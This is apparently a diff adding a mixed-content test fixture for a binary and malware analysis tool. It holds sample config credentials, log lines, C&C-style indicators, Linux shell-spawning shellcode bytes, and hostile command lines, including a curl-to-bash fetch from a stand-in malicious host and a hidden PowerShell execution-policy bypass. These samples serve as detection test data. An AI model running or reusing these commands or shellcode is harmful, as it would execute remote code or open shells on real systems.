@@ -1,0 +1,109 @@
+ThreatFlux Binary Analysis - Mixed Content Test File
+=================================================
+
+This file contains various types of content for testing text analysis capabilities.
+
+Section 1: Configuration Data
+-----------------------------
+[database]
+host = db.threatflux.com
+port = 5432
+username = analysis_user
+password = super_secret_password_123!
+ssl_mode = require
+
+[api]
+endpoint = https://api.threatflux.com/v2
+api_key = tf_ak_1a2b3c4d5e6f7g8h9i0j
+timeout = 30
+retries = 3
+
+Section 2: Log Entries
+---------------------
+2024-08-16 10:15:32 [INFO] Binary analysis started for file: malware_sample.exe
+2024-08-16 10:15:33 [DEBUG] PE header validation: PASSED
+2024-08-16 10:15:33 [WARN] Suspicious import detected: kernel32.dll!CreateRemoteThread
+2024-08-16 10:15:34 [ERROR] Failed to parse section .rsrc: Invalid offset 0x12345678
+2024-08-16 10:15:35 [INFO] String analysis complete: 1247 strings extracted
+2024-08-16 10:15:36 [CRITICAL] Malware signature match: Trojan.Win32.Emotet.variant
+
+Section 3: Network Indicators
+----------------------------
+IP Addresses:
+192.168.1.100 - Internal analysis server
+10.0.0.15 - Sandbox environment
+203.0.113.45 - Suspicious external IP
+198.51.100.22 - Known C&C server
+
+Domain Names:
+malware-analysis.threatflux.com
+c2-server.malicious-domain.net
+update.legitimate-software.com
+backdoor.suspicious-site.org
+
+URLs:
+https://api.virustotal.com/api/v3/files/analyze
+http://malware-feed.badguys.net/latest
+ftp://data-exfil.criminal.org/upload
+https://pastebin.com/raw/AbCdEfGh
+
+Section 4: Hexadecimal Data
+--------------------------
+PE Header: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00
+ELF Header: 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00
+Mach-O: CF FA ED FE 07 00 00 01 03 00 00 80 02 00 00 00
+Java Class: CA FE BA BE 00 00 00 34 00 1F 0A 00 06 00 12
+
+Shellcode Pattern: 
+31 C0 50 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 50
+53 89 E1 B0 0B CD 80 90 90 90 90 90 90 90 90 90
+
+Section 5: Base64 Encoded Data
+-----------------------------
+Configuration: SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IG1lc3NhZ2U=
+Payload: VGhyZWF0Rmx1eCBCaW5hcnkgQW5hbHlzaXMgVGVzdA==
+Encoded URL: aHR0cHM6Ly9hcGkudGhyZWF0Zmx1eC5jb20vdjEvcmVwb3J0
+
+Section 6: Registry Keys (Windows)
+---------------------------------
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\malware_service
+HKEY_CURRENT_USER\Software\Classes\exefile\shell\open\command
+
+Section 7: File Paths
+--------------------
+C:\Windows\System32\kernel32.dll
+C:\Program Files\ThreatFlux\Analyzer\bin\scanner.exe
+/usr/bin/python3
+/etc/passwd
+/var/log/security.log
+/tmp/.hidden_malware
+~/Documents/sensitive_data.xlsx
+
+Section 8: Cryptocurrency Addresses
+----------------------------------
+Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+Ethereum: 0x742d35Cc6635C0532925a3b8D0Ca6982A68bD4C8
+Monero: 47v1pcdrA8NPnKGNNhJJrR5ByKBJDSCzKvP1YoN8sKH5XvE8KLhkgNQ8PKN1KnrQXkuDu6E8kZLfkGNm7t8Kx
+
+Section 9: Commands and Scripts
+------------------------------
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden
+cmd.exe /c "echo Hello > C:\temp\test.txt"
+bash -c 'curl -s http://malicious.com/payload | bash'
+python -c "import os; os.system('whoami')"
+
+Section 10: Email Addresses
+--------------------------
+admin@threatflux.com
+security-reports@company.org
+noreply@malicious-phishing.net
+contact@legitimate-vendor.com
+
+This file contains 47 lines of mixed content including configuration data,
+log entries, network indicators, hexadecimal patterns, encoded data,
+system paths, and various other artifacts commonly found during
+binary and malware analysis.
+
+End of test file.
